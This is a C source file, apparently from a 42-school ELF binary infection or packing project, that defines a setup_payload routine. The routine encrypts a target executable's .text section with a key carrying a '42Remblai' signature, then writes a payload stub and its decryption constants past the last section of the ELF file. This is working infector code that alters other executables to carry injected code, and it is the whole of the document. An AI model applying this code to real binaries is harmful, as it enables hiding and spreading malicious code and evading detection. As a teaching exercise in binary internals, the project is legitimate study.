/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   setup_payload.c                                    :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/05/11 00:10:33 by agrumbac          #+#    #+#             */
/*   Updated: 2019/06/06 04:52:24 by agrumbac         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <stdint.h>
#include <stdlib.h>
#include <time.h>
#include <stdbool.h>
#include <linux/elf.h>
#include "utils.h"
#include "infect.h"

/*
**  Elf64_packer memory overview
**  ============================
**
**         | mem address | file offset | payload rel address      |
**         | ----------- | ----------- | ------------------------ |
**         | p_vaddr     | p_offset    | relative_pt_load_address |
**         |             |             |                          |
**         | sh_addr     | sh_offset   | relative_text_address    |
**         |             |             |                          |
**         | e_entry     |             | relative_entry_address   |
**
**                          .        .
**                          |  ...   |
**              p_offset -> |========| PT_LOAD  - relative_pt_load_address
**                          |  ...   |          ^
**                          |  ...   |          |
**             sh_offset -> |--------| .Text    |- relative_text_address
**                      |   |  ...   |          |^
**                      V   |  ...   |          ||
**    offset_in_section -   |>>>>>>>>| entry    ||- relative_entry_address
**                          |  ...   |          ||^
**                          |--------|          |||
**                          |  ...   |          |||
**                          |  ...   |          |||
**                          |  ...   |          |||
**   end_of_last_section -> |@@@@@@@@| payload  |||
**                          |@      @| |
**                          |@      @| V
**                          |@@@@@@@@| payload_size
**                          |========|
**                          |  ...   |
**                          .        .
*/

# define CALL_INSTR_SIZE	5 /* sizeof "call mark_below" -> e8 2000 0000 */
# define SECRET_SIGNATURE	(char[10]){'4','2','R','e','m','b','l','a','i','\0'}
# define SECRET_LEN		10

struct payload_constants
{
	uint32_t	key[4];
	uint64_t	relative_pt_load_address;
	uint64_t	pt_load_size;
	uint64_t	relative_text_address;
	uint64_t	relative_entry_address;
	uint64_t	text_size;
}__attribute__((packed));

static void	generate_key(char *buffer, size_t len)
{
	for (size_t i = 0; i < len; i++)
		buffer[i] = ft_rand();
}

static void	init_constants(struct payload_constants *constants, \
			const struct entry *original_entry, \
			const struct endians_pointer endians)
{
	ft_memcpy(constants->key, SECRET_SIGNATURE, SECRET_LEN);
	generate_key((char *)constants->key + SECRET_LEN, 16 - SECRET_LEN);

	const size_t		end_of_last_section = original_entry->end_of_last_section;
	const Elf64_Off		p_offset  = endians.endian_8(original_entry->safe_phdr->p_offset);
	const Elf64_Xword	p_memsz   = endians.endian_8(original_entry->safe_phdr->p_memsz);
	const Elf64_Off		sh_offset = endians.endian_8(original_entry->safe_shdr->sh_offset);
	const size_t		sh_size   = endians.endian_8(original_entry->safe_shdr->sh_size);

	constants->relative_pt_load_address = end_of_last_section - p_offset;
	constants->pt_load_size             = p_memsz;
	constants->relative_text_address    = end_of_last_section - sh_offset;
	constants->relative_entry_address   = constants->relative_text_address - original_entry->offset_in_section;
	constants->text_size                = sh_size;
}

bool		setup_payload(const struct entry *original_entry, \
			const struct endians_pointer endians, \
			const struct safe_pointer info)
{
	struct payload_constants	constants;

	init_constants(&constants, original_entry, endians);

	const size_t	payload_size = end_payload - begin_payload;
	const size_t	text_size    = endians.endian_8(original_entry->safe_shdr->sh_size);
	const size_t	payload_off  = original_entry->end_of_last_section;
	const size_t	text_off     = payload_off - constants.relative_text_address;

	void	*payload_location    = safe(payload_off, payload_size);
	void	*constants_location  = safe(payload_off + CALL_INSTR_SIZE, sizeof(constants));
	void	*text_location       = safe(text_off, text_size);

	if (!payload_location || !constants_location || !text_location)
		return (false);

	encrypt(32, text_location, constants.key, text_size);
	ft_memcpy(payload_location, begin_payload, payload_size);
	ft_memcpy(constants_location, &constants, sizeof(constants));

	return true;
}
